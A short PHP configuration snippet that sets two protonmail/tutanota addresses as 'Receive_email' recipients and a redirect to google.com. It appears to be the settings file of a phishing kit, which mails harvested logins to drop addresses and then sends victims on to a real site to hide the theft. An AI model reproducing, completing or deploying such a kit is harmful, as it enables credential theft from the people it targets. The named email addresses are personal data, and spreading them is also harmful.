<?php 
$Receive_email="annabellww@protonmail.com,corneliuscooo@tutanota.com";
$redirect="https://www.google.com/";
?>